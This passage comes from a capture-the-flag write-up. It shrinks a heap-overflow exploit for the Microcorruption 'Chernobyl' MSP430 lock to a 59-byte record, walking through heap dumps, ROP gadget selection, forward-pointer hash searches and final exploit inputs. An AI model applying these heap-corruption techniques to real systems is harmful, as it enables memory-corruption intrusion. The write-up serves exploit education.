│    ▼                            │  │    ▼                          
│ ┌────────┬────────┬────────┐    │  │ ┌────────┬────────┬────────┐  
└─┤  <u>3de6</u>  │  <u>515c</u>  │  <mark><u>0013</u></mark>  │    │  └─┤  <u>3de6</u>  │  <u>51bc</u>  │  <mark><u>0186</u></mark>  │  
  └────────┴─────┬──┴────────┘    │    └────────┴─────┬──┴────────┘  
     ▲           │                │       ▲           │              
┌────┘           │                │  ┌────┘           │              
│                │                │  │                │              
│                └─────────────┐  │  │    ┌───────────┘              
│                              │  │  │    ▼                          
│ ┌────────┬────────┬────────┐ │  │  │ ┌────────┬────────┬────────┐  
└─┤  509c  │  515c  │  00b5  │ │  │  └─┤  ....  │  ....  │  ....  │  
  └────────┴─────┬──┴────────┘ │  │    └────────┴────────┴────────┘  
     ▲           │             │  │                                  
┌────┘ ┌─────────┘             │  │                                  
│      │                       │  │                                  
│      │ ┌─────────────────────┘  │                                  
│      ▼ ▼                        │                                  
│ ┌────────┬────────┬────────┐    │                                  
└─┤  50fc  │  51bc  │  00b5  │    │                                  
  └────────┴─────┬──┴────────┘    │                                  
     ▲           │                │                                  
┌────┘           │                │                                  
│                │                │                                  
│    ┌───────────┘                │                                  
│    ▼                            │                                  
│ ┌────────┬────────┬────────┐    │                                  
└─┤  ....  │  ....  │  ....  │    │                                  
  └────────┴────────┴────────┘    │                                  
</code></pre>

<p>The new forward pointer effectively breaks the linked list in a way that causes the algorithm to write the sum of all freed chunk sizes to the size field in the overflowed chunk—rather than the "chunk" on the stack. Additional testing confirms that this works when skipping any number of chunks. Eliminating the bug can thus be accomplished by omitting <code>0x50fc</code> from the list of forward pointers.</p>

<pre><code>&gt;&gt;&gt; fdlist = ["5c51", "bc51", "1c52", "7c52", "dc52", "3c53"]</code></pre>


<h4>Partially Skipping Function Prologues</h4>

<p>After this, the search for a suitable ROP gadget becomes increasingly constrained. None of the single <code>POP</code> gadgets hash to the correct bucket. The nearest location in memory with a viable alternative gadget is near the beginning of the <code>putchar</code> function.</p>

<pre><code>4d04:  2183           decd      sp
<mark>4d06:  0f12           push      r15</mark>
4d08:  0312           push      #0x0
4d0a:  814f 0400      mov       r15, 0x4(sp)
4d0e:  b012 ec4c      call      #0x4cec &lt;INT&gt;
4d12:  1f41 0400      mov       0x4(sp), r15
4d16:  3150 0600      add       #0x6, sp
4d1a:  3041           ret
</code></pre>

<p>Returning here will skip the first instruction in the function and misalign the stack pointer by one word. The function will then make a harmless call to write a single character to the I/O console. When the interrupt call returns, <code>putchar</code> will increment the stack pointer and return. Because returning into the middle of the function earlier skipped the first push instruction during the function prologue, this causes it to pop an extra word off the stack and align the stack pointer with attacker-controlled data. The size field to accomplish this is as follows.</p>

<pre><code>&gt;&gt;&gt; rop_gadget_address = 0x4d06
&gt;&gt;&gt; return_address = 0x4cbc
&gt;&gt;&gt; hex((rop_gadget_address-return_address-6+1) &amp; 0xffff)
'<mark>0x45</mark>'
</code></pre>

<p>The forward pointer search is as follows.</p>

<pre><code>&gt;&gt;&gt; for i in fdlist:
...     overflow &#x3D; b&#39;e63d&#39; + i.encode() + b&#39;<mark>45</mark>&#39;
...     if hash_username(overflow) % 8 &#x3D;&#x3D; 0:
...         print(overflow)
b&#39;<mark>e63d1c5245</mark>&#39;
b&#39;e63d7c5245&#39;
b&#39;e63ddc5245&#39;
</code></pre>

<p>Any of the above forward pointers will work, so the first is chosen arbitrarily.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000<mark>e63d1c5245</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>

<p>This exploit successfully triggers the unlock interrupt.</p>

<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>60</mark></code></pre>

<h3>Leaderboard Ranking</h3>

<p>Shrinking the exploit to this length puts it in 4th place globally on the Chernobyl exploit size leaderboard.</p>


      <br>
      <table>
        <caption>Chernobyl Exploit Size Leaderboard</caption>
        <thead>
          <tr>
            <th>Position</th>
            <th>Username</th>
            <th>Exploit Size (Bytes)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>1st</code></td>
		  <td><code>ThatsMe</code></td>
		  <td><code>59</code></td>
          </tr>
          <tr>
		  <td><code>2nd</code></td>
		  <td><code><em>Unknown</em></code></td>
		  <td><code>60</code></td>
          </tr>
          <tr>
		  <td><code>3rd</code></td>
		  <td><code><em>Unknown</em></code></td>
		  <td><code>60</code></td>
          </tr>
          <tr>
		  <td><code><mark>4th</mark></code></td>
		  <td><code>b9ek</code></td>
		  <td><code>60</code></td>
          </tr>
          <tr>
		  <td><code>5th</code></td>
		  <td><code><em>Unknown</em></code></td>
		  <td><code>61</code></td>
          </tr>
          <tr>
		  <td><code>6th</code></td>
		  <td><code><em>Unknown</em></code></td>
		  <td><code>61</code></td>
          </tr>
        </tbody>
      </table>

      <p>The exploit is now in a three-way tie for the second shortest input length.</p>

      <h4>Obligatory Cinema Reference</h4>
<blockquote>
There are only about six people in the world who could set up fail-safes like this.<br>
<cite>— Q, James Bond: Skyfall</cite>
</blockquote>

<h3>Tying The World Record</h3>

<h4>Fifty-Nine Bytes</h4>

<p>Eleven of twelve commands are as short as possible, and the overflow is absurdly constrained. Short of a miracle, manually shortening the exploit further is impossible.</p>

<h4>Bootstrapping Miracles</h4>

<p>Observe the heap memory before the overflow.</p>

<pre><code>5090: 0000 0000 0000 0000 0000 0000 <mark>3c50 fc50</mark>   ............&lt;P.P
50a0: <mark>b5</mark>00 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *
</code></pre>

<p>There is no null termination for the string that overflows the heap metadata, which makes it possible to overflow the back and forward pointers without corrupting the size.</p>

<pre><code>5090: 0000 0000 0000 0000 0000 0000 <mark>3c50 fc50</mark>   ............&lt;P.P
50a0: b500 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *
</code></pre>

<p>Eliminating the size field from the exploit means the algorithm will add the existing size (sans the least significant bit) to the return address.</p>

<pre><code>&gt;&gt;&gt; return_address = 0x4cbc
&gt;&gt;&gt; existing_size = 0xb5
&gt;&gt;&gt; hex(return_address+existing_size+6-1)
'<mark>0x4d76</mark>'
</code></pre>

<p>The code will then return here.</p>

<pre><code>4d6a:  3012 0a00      push      #0xa
4d6e:  0312           push      #0x0
4d70:  b012 ec4c      call      #0x4cec &lt;INT&gt;
4d74:  2152           add       #0x4, sp
<mark>4d76:  0f43           clr       r15</mark>
4d78:  3b41           pop       r11
4d7a:  3041           ret
</code></pre>

<p>By <em>sheer coincidence</em>, this returns to a gadget that will pop one word off the stack and redirect execution to the attacker-controlled ROP chain. Given the arrangement of functions in the firmware image, the odds of this happening are extremely low—even without accounting for many potential side effects.</p>

<p>The issue is that there is not a suitable forward pointer available.</p>

<pre><code>&gt;&gt;&gt; fdlist = [&quot;5c51&quot;, &quot;bc51&quot;, &quot;1c52&quot;, &quot;7c52&quot;, &quot;dc52&quot;, &quot;3c53&quot;]
&gt;&gt;&gt; for i in fdlist:
...     overflow = b&apos;e63d&apos; + i.encode() + b&apos;&apos;
...     if hash_username(overflow) % 8 == 0:
...         print(overflow)
&gt;&gt;&gt;
</code></pre>

<h4>Forward Pointer Black Magic</h4>
<p>Up to this point, it has been convenient to think of a valid forward pointer as one that points to any subsequent heap chunk. Recall how the algorithm works.</p>

<ol>
	<li>The <code>malloc</code> function traverses the linked list and allocates from the first free chunk it finds—usually the wilderness chunk.</li>
	<li>During <code>rehash</code>, the <code>free</code> function is called iteratively on an array of pointers referencing in-use heap chunks.</li>
</ol>

<p>The forward pointer does not affect the arbitrary write—the sole purpose of setting it to a specific value is to avoid the <code>malloc</code> heap exhaustion error. This issue is avoidable if <code>malloc</code> finds a large enough free chunk for allocation. The earlier solution to this problem is to ensure the algorithm eventually reaches the wilderness chunk, but nothing requires it to allocate from that <em>specific</em> free chunk.</p>

<p>The <code>malloc</code> code that vets each chunk looks something like this.</p>

<pre><code>*(fd + 0x4) &amp; 0x1 == 0 &amp;&amp; *(fd + 0x4) &gt;= size_to_be_allocated;</code></pre>

<p>What this means is that allocation will succeed as long the "size field" of the "next chunk" is large enough and even—even if the "next chunk" is <em>random data</em> at a memory location chosen by the attacker. The only constraint is that this data must be in higher memory than the current chunk. Consider the following structure, for example.</p>

<pre><code>ff80: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ff90: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffa0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffb0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffc0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffd0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffe0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
fff0: 4444 4444 4444 4444 4444 4444 4444 0044   DDDDDDDDDDDDDD.D
</pre></code>

<p>All these words are high value and even, so aiming the forward pointer into the middle of the structure will cause the algorithm to interpret one of them as the next chunk's size. The <code>malloc</code> function will then allocate from that fake "next chunk", avoiding the heap exhaustion error. Suppose the forward pointer is <code>0xff86</code>. The fake chunk metadata will be here:</p>

<pre><code>ff80: 4444 4444 4444 <mark>4444 4444 4444</mark> 4444 4444   DDDDDDDDDDDDDDDD
ff90: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffa0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffb0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffc0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffd0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffe0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
fff0: 4444 4444 4444 4444 4444 4444 4444 0044   DDDDDDDDDDDDDD.D
</pre></code>

<p>The ability to choose from more forward pointers reduces the search constraints. This forward pointer hashes to bucket zero.</p>

<pre><code>&gt;&gt;&gt; overflow = b&apos;e63d&apos; + b&apos;<mark>86ff</mark>&apos;
... if hash_username(overflow) % 8 == 0:
...     print(overflow)
b&apos;<mark>e63da6ff</mark>&apos;</code></pre>

<p>The exploit is then as follows.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d<mark>86ff</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>

<h4>Allocations That Overflow The End Of The Address Space</h4>

<p>Running this exploit results in the following error.</p>

<pre><code>Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account = with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account  with pin 0000.
Adding user account with pin 0000.
<mark>Heap exausted; aborting.</mark>
</code></pre>

<p>Breaking at the start of <code>malloc</code> reveals that the first few allocations succeed. The issue is that this data structure is at the end of memory, so, eventually, the heap will wrap around to address <code>0x0000</code>.</p>

<pre><code>ff80: 4444 4444 4444 4444 acff 4100 d8ff 4444   DDDDDDDD..A...DD
ff90: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffa0: 4444 4444 4444 4444 4444 4444 86ff d2ff   DDDDDDDDDDDD....
ffb0: 4100 0000 4444 4444 4444 4444 4444 4444   A...DDDDDDDDDDDD
ffc0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffd0: 4444 acff 3200 b500 4444 4444 4444 4444   DD..2...DDDDDDDD
ffe0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
fff0: 4444 4444 4444 4444 4444 4444 4444 0044   DDDDDDDDDDDDDD.D
</code></pre>

<pre><code>0000: 0000 4400 0000 0000 0000 0000 0000 0000   ..D.............
0010: 3041 0000 0000 0000 0000 0000 0000 0000   0A..............
0020: 0000 0000 0000 0000 0000 0000 0000 0000   ................
0030: 0000 d2ff 4444 ec42 0000 0000 0000 0000   ....DD.B........
0040: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<p>This phenomenon causes the next chunk to be lower than the start of the heap at address <code>0x5000</code>, triggering the error.</p>

<h4>Misaligning Forward Pointers</h4>
<p>Again, the first few allocations from the fake wilderness chunk succeed. The only issue is that the data structure is at the top of the address space, which necessitates finding a different one low enough in memory to avoid causing an integer overflow upon allocation. These are the viable candidates.</p>

<pre><code>5000: 0050 1050 1500 0000 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0000 0000   &quot;R.R.R.P&lt;P!.....
5030: 0000 0000 0000 0000 0000 0000 2650 9c50   ............&amp;P.P
5040: b500 0000 0000 0000 0000 0000 0000 0000   ................
5050: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5060: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  
<mark>50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 0000 0000 0000 0000 0000 0000 0000   ................
5170: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5180: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 0000 0000 0000 0000 0000 0000 0000   ................
51d0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51e0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 0000 0000 0000 0000 0000 0000 0000   ................
5230: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5240: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 0000 0000 0000 0000 0000 0000 0000   ................
5290: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52a0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 0000 0000 0000 0000 0000 0000 0000   ................
52f0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5300: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................</mark>
5360: *  
ff80: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ff90: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffa0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffb0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffc0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffd0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
ffe0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
fff0: 4444 4444 4444 4444 4444 4444 4444 0044   DDDDDDDDDDDDDD.D
</code></pre>

<p>The options are sparse, with the targets being the metadata for other heap chunks. Until now, the forward pointer has been aimed at the first word of each metadata header—as the algorithm expects. This approach is not the only option, however. Consider the next heap chunk, for example.</p>

<pre><code>50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
</code></pre>

<p>The forward pointer typically points to the first of these three words, and the size is at a fixed offset two words higher in memory.</p>

<pre><code>50f0: 0000 0000 0000 0000 0000 0000 <mark>9c50</mark> 5c51   .............P\Q
5100: <mark>b500</mark> 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
</code></pre>

<p>Suppose the forward pointer is aimed just before the metadata for the next chunk.</p>

<pre><code>50f0: 0000 0000 0000 0000 0000 <mark>0000</mark> 9c50 5c51   .............P\Q
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
</code></pre>

<p>Relative to this word, the size field would be at a fixed offset two words higher in memory.</p>

<pre><code>50f0: 0000 0000 0000 0000 0000 <mark>0000</mark> 9c50 <mark>5c51</mark>   .............P\Q
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
</code></pre>

<p>It is possible to misalign the overflowed forward pointer so that the algorithm interprets the forward pointer for the next chunk as the size. This word is both high value and even, which fulfills the requirements for allocation. As a result, there are effectively eight more valid forward pointers.</p>

<h5>Attempt #1:</h5>
<p>Setting <code>0xfa50</code> as the forward pointer should theoretically work.</p>

<pre>&gt;&gt;&gt; overflow = b&apos;e63d&apos; + b&apos;<mark>fa50</mark>&apos;
... if hash_username(overflow) % 8 == 0:
...     print(overflow)
&gt;&gt;&gt;
</pre>

<p>Unfortunately, this does not hash to bucket zero. In this case, there is also the possibility of doing a partial overflow.</p>

<pre><code>5090: 0000 0000 0000 0000 0000 0000 <mark>3c50 fc</mark>50   ............&lt;P.P
50a0: b500 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *
</code></pre>

<p>Only the least significant byte of the forward pointer requires alteration to aim it at address <code>0x50fa</code>.</p>

<pre><code>&gt;&gt;&gt; overflow = b&apos;e63d&apos; + b&apos;<mark>fa</mark>&apos;
... if hash_username(overflow) % 8 == 0:
...     print(overflow)
&gt;&gt;&gt;
</code></pre>

<p>Unfortunately, this one does not hash to bucket zero either.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
The failure of this attempt is a shame because it would have shrunk the exploit size to fifty-eight bytes and beat the world record. 
</span></p>

<h5>Attempt #2:</h5>

<p>It is also possible to misalign the forward pointer so that the algorithm interprets the back pointer for the next chunk as the size.</p>

<pre><code>50f0: 0000 0000 0000 0000 <mark>0000</mark> 0000 <mark>9c50</mark> 5c51   .............P\Q
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
</code></pre>

<p>This approach provides an <em>additional</em> eight valid forward pointers. The new forward pointer search is as follows.</p>

<pre><code>&gt;&gt;&gt; overflow = b&apos;e63d&apos; + b&apos;<mark>f850</mark>&apos;
... if hash_username(overflow) % 8 == 0:
...     print(overflow)
&gt;&gt;&gt;
</code></pre>

<p>This pointer still does not have the correct hash. Like the previous case, it is once again possible to do a partial overwrite.</p>

<pre><code>&gt;&gt;&gt; overflow = b&apos;e63d&apos; + b&apos;<mark>f8</mark>&apos;
... if hash_username(overflow) % 8 == 0:
...     print(overflow)
&gt;&gt;&gt;
</code></pre>

<p>This partial overflow does not have the correct hash either.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	It is possible to automate this search, but that would be excessive considering that there are under two dozen possibilities.
</span></p>

<h5>Attempt #3:</h5>

<p>Below is the chunk containing hash bucket #3. The corrupted forward pointer is misaligned as follows.</p>

<pre><code>5150: 0000 0000 0000 0000 <mark>0000</mark> 0000 <mark>fc50</mark> bc51   .............P.Q
5160: b500 0000 0000 0000 0000 0000 0000 0000   ................
5170: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5180: *  
</code></pre>

<p>The result:</p>


<pre><code>&gt;&gt;&gt; overflow = b&apos;e63d&apos; + b&apos;<mark>5851</mark>&apos;
... if hash_username(overflow) % 8 == 0:
...     print(overflow)
b&apos;<mark>e63d5851</mark>&apos;
&gt;&gt;&gt;
</code></pre>

<p>The final world record exploit is as follows.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000<mark>e63d5851</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>


<h4>Razing The Heap For Fun And Profit</h4>


<p>When <code>malloc</code> attempts to allocate space for the new table, it will traverse the forward pointers in the linked list to find a large enough free chunk. The deliberately misaligned forward pointer will cause it to cannibalize the metadata for a chunk in the middle of the existing hash table, creating a series of new chunks partially overlapping the old ones.</p>

<br>
<ul id="nav">
  <li><a href="#memory-before-obliteration">Heap Memory Before Exploit</a></li>
  <li><a href="#memory-after-obliteration">Heap Memory After Exploit</a></li>
</ul>

<div id="slides">
  <section id="memory-before-obliteration">
<pre><code>5000: 0050 1050 1500 0000 0400 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0700 0000   &quot;R.R.R.P&lt;P!.....
5030: 0000 0100 0100 0100 0100 0000 2650 9c50   ............&amp;P.P
5040: b500 f000 0000 0000 0000 0000 0000 0000   ................
5050: 0000 0000 e000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 d000 0000 0000 0000 0000   ................
5070: 0000 0000 0000 0000 c000 0000 0000 0000   ................
5080: 0000 0000 0000 0000 0000 b000 0000 0000   ................
5090: 0000 0000 0000 0000 0000 0000 <mark>e63d 5851</mark>   .............&#x3D;XQ
50a0: b500 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
<mark>5150</mark>: 0000 0000 0000 0000 <mark>0000 0000 fc50 bc51</mark>   .............P.Q
5160: b500 dd00 0000 0000 0000 0000 0000 0000   ................
5170: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5180: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 cc00 0000 0000 0000 0000 0000 0000   ................
51d0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51e0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 bb00 0000 0000 0000 0000 0000 0000   ................
5230: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5240: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 aa00 0000 0000 0000 0000 0000 0000   ................
5290: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52a0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 0000 0000 0000 0000 0000 0000 0000   ................
52f0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5300: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
  <section id="memory-after-obliteration">
<pre><code>5000: 0050 1050 1500 0700 0400 0500 5e51 8451   .P.P........^Q.Q
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0700 0000   &quot;R.R.R.P&lt;P!.....
5030: 0000 0100 0100 0100 0100 0000 2650 9c50   ............&amp;P.P
5040: b500 f000 0000 0000 0000 0000 0000 0000   ................
5050: 0000 0000 e000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 d000 0000 0000 0000 0000   ................
5070: 0000 0000 0000 0000 c000 0000 0000 0000   ................
5080: 0000 0000 0000 0000 0000 b000 0000 0000   ................
5090: 0000 0000 0000 0000 0000 0000 <mark>e63d 5851</mark>   .............&#x3D;XQ
50a0: b500 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5120: *  
<mark>5150</mark>: 0000 0000 0000 0000 <mark>0000 7e51 4100 aa51</mark>   ..........~QA..Q
5160: <mark>0a52 6a52 ca52 2a53 8a53 ea53 4a54 aa54</mark>   .RjR.R*S.S.SJT.T
5170: <mark>0a55 6a55 ca55 2a56 8a56 ea56 4a57 5851</mark>   .UjU.U*V.V.VJWXQ
5180: <mark>a451 4100 0600 0000 0000 0000 0000 0000</mark>   .QA.............
5190: <mark>0000 0000 0000 0000 0000 0100 0000 0000</mark>   ................
51a0: <mark>0000 0000 7e51 0452 b500 f000 0000 0000</mark>   ....~Q.R........
51b0: <mark>0000 0000 0000 0000 0000 0000 e051 1c52</mark>   .............Q.R
51c0: <mark>b500 cc00 0000 0000 0000 0000 0000 d000</mark>   ................
51d0: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
51e0: <mark>c000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
51f0: <mark>0000 b000 0000 0000 0000 0000 0000 0000</mark>   ................
5200: <mark>0000 0000 a451 6452 b500 0000 0000 0000</mark>   .....QdR........
5210: <mark>0000 0000 0000 0000 0000 0000 bc51 7c52</mark>   .............Q|R
5220: <mark>b500 bb00 0000 0000 0000 0000 0000 0000</mark>   ................
5230: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
5240: <mark>* </mark> 
5260: <mark>0000 0000 0452 c452 b500 0000 0000 0000</mark>   .....R.R........
5270: <mark>0000 0000 0000 0000 0000 0000 1c52 dc52</mark>   .............R.R
5280: <mark>b500 aa00 0000 0000 0000 0000 0000 0000</mark>   ................
5290: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
52a0: <mark>*  </mark>
52c0: <mark>0000 0000 6452 2453 b500 0000 0000 0000</mark>   ....dR$S........
52d0: <mark>0000 0000 0000 0000 0000 0000 7c52 3c53</mark>   ............|R&lt;S
52e0: <mark>b500 0000 0000 0000 0000 0000 0000 0000</mark>   ................
52f0: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
5300: <mark>*  </mark>
5320: <mark>0000 0000 c452 8453 b500 0000 0000 0000</mark>   .....R.S........
5330: <mark>0000 0000 0000 0000 0000 0000 dc52 0050</mark>   .............R.P
5340: <mark>7cf9 0000 0000 0000 0000 0000 0000 0000</mark>   |...............
5350: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
5360: *  
5380: 0000 0000 2453 e453 b500 0000 0000 0000   ....$S.S........
5390: 0000 0000 0000 0000 0000 0000 0000 0000   ................
53a0: *  
53e0: 0000 0000 8453 4454 b500 0000 0000 0000   .....SDT........
53f0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5400: *  
5440: 0000 0000 e453 a454 b500 0000 0000 0000   .....S.T........
5450: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5460: *  
54a0: 0000 0000 4454 0455 b500 0000 0000 0000   ....DT.U........
54b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
54c0: *  
5500: 0000 0000 a454 6455 b500 0000 0000 0000   .....TdU........
5510: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5520: *  
5560: 0000 0000 0455 c455 b500 0000 0000 0000   .....U.U........
5570: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5580: *  
55c0: 0000 0000 6455 2456 b500 e63d 5851 b500   ....dU$V...&#x3D;XQ..
55d0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
55e0: *  
5620: 0000 0000 c455 8456 b500 0000 0000 0000   .....U.V........
5630: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5640: *  
5680: 0000 0000 2456 e456 b500 0000 0000 0000   ....$V.V........
5690: 0000 0000 0000 0000 0000 0000 0000 0000   ................
56a0: *  
56e0: 0000 0000 8456 4457 b500 0000 0000 0000   .....VDW........
56f0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5700: *  
5740: 0000 0000 e456 a457 b500 0000 0000 0000   .....V.W........
5750: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5760: *  
57a0: 0000 0000 4457 0000 6444 0000 0000 0000   ....DW..dD......
57b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
57c0: *  
</code></pre>
  </section>
</div>

<p>By yet another miracle, this does not derail execution during the subsequent <code>free</code> calls. The data in the overlapping chunks is sparse enough not to overwrite any structure that will break the exploit. The unlock interrupt triggers successfully.</p>

<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 225202 cycles.
</code></pre>

<p>The final length of the exploit is 59 bytes.</p>
<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>59</mark></code></pre>


<h2>One In Ten Thousand</h2>

<p>As of July 2022, two known copies of this exploit exist on Earth.</p>

      <br>
      <table>
